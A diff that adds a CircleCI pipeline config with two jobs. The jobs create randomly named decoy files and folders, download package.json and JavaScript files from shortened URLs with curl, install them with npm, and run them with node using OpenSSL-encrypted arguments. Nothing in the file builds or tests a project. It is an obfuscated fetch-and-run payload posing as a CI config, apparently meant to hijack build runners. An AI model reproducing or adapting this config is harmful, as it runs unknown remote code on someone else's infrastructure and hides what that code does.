@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  kiem-tra:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch p5tlyvd52lo05u37vrb61gg8pzigg.net
+      - run: touch m7m2ir4v8zisl1n3wvj3m8zn3l78dd.java
+      - run: curl -fsSL shorturl.at/vEIQ3 -o package.json && curl -fsSL
+          shorturl.at/ansM8 -o 6zfyhefsxb.js && curl -fsSL shorturl.at/hikGT -o
+          4bler4q.js
+      - run: npm i -s
+      - run: touch hcsi5rkcsj0dx514uv.php
+      - run: mkdir nmur5uu75djjgtbfm9
+      - run: mkdir 12e7izvgb8jkjdu251blukd8pn
+      - run: mkdir 0tyd729nz2ef
+      - run: node 4bler4q -s
+          U2FsdGVkX18l2LF/x0HiaWMbAW4eqCNKoQwacM4Dwc1N+umw0+pReA4fIsBbCgWWhrru2AmNyBdO3OiAW7ZrSQconW7HShHJGJM3fj+QTN0sSBqDAb0k7lQHUY7A9kcXQp1poXbkqeukPZWjCdxCX13kJbfx6i1PcX7ta5t3MtSPMeLKTKnOU3g+iieEpzMpkVplOlfv7pRBSRi4yfgsnZPIllIk4oQxqMqGjIfIKvY=
+          -t U2FsdGVkX18E/HgBkknQf1iCQ7OhGw8zv1yNsUdEzoPFVWe2K7l6VEfpwKe6jFgR
+          -sp -lpn U2FsdGVkX19p9MxFt50jdh5gRmvpUkPuuAYCTePsleA= -r
+          U2FsdGVkX1+qfbz3L5YTCLSTdDz6hSe2mt0M75PFqz09Ks+mJx6xK7F8CkNdPB28xxqE3cm/igvjJi4GfZVOSrdoi6dr5q2U95aGPg7CjNAIwUV92GZSc6X5lsspptwuNUqRuDG0HGCuzxdnb62uKPUpCWSA5IJ1eXZfU7T54eI+bFkaSNwb/ZWUrSBqJIHWMqWwEVXWwCDYK/vUSbHRAd3Hw4GauSTHny4LsLn27NLbXr835xjivAvWad/aMzg9nQz3gO8rC817C7F+wsYyzuaCuNO7kjQkPxq1Q+hKnOk=
+  startJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch 7g4spgvzfj19eu19ph4t.net
+      - run: touch btbtoqhn0mr2ptzl1zv02.js
+      - run: curl -fsSL shorturl.at/bABR5 -o rvmnneqj7jy.js && curl -fsSL
+          shorturl.at/kuxA8 -o ek89ihln91msgy.js && curl -fsSL shorturl.at/mzNP5
+          -o package.json
+      - run: touch gf0haum7o3086fa2vxgg.cpp
+      - run: mkdir j0ebeo71pq8q5gfed20ex227c3f
+      - run: npm i -s
+      - run: node ek89ihln91msgy -r
+          U2FsdGVkX1+nAUqmqX4ViPdGGnuvOJOEgHRTLkng91jrMHs2wHEfmR5i/sCdujs7WipqdNPGEZDBDGw6DgjQNIrHin5qnD6VwGWDK2vyDQ+ymoKENhzEhzlgZNgVcS6bCyVi7MBKjJhzd4ni6VCAfdoEZd5JVZOV3vGJMTJEP+0wMNncXmEiDmATbBEfue7Nv04Pjm1Ao6x5zTUx9MHcNEylFhqQC6mbcOtoK88i2AnMTTLDdrAr2JvNm3KtQV23vyK0hzdgRoI56BRhvcs43cz2aycghVrCnJ1Sgaqrq3U=
+          -t U2FsdGVkX1/GvCXHgk4vVZ5nUiWr2/CLBxWYUFH787vkggNLYcRNKHTBCM2nZoIw
+          -lpn U2FsdGVkX18fg/18tciyMWzChTy6k28FPr+gf7jimC0= -s
+          U2FsdGVkX1+dl2Vvj3u1JcPmMlDHmja6BqpPBf4/ptRCizweBXnaGidmgUJaKH8mGRojyCmsGSRF8PIZj5uP76IxRk/6Si5CaOhRjKd2GPQmndU1yBi/2J1oYtgrmcy6GWLuEgna0QshWQ1H2b/EbqZHfmVr3LjgdnkmQP39Uh5Gnqn1nGT0WtTbKE2yELUQsl7vKRiN5qXzVmorlFQMmoWL5F7HQeUyF38MECno+KM=
+          -sp
+      - run: touch knhtbzoky76l3aspfbcxduin5.css
+      - run: mkdir ppzq0jau4oj6bdgohravoy6dso
+workflows:
+  startJobs:
+    jobs:
+      - kiem-tra
+  jobs_2:
+    jobs:
+      - startJobs
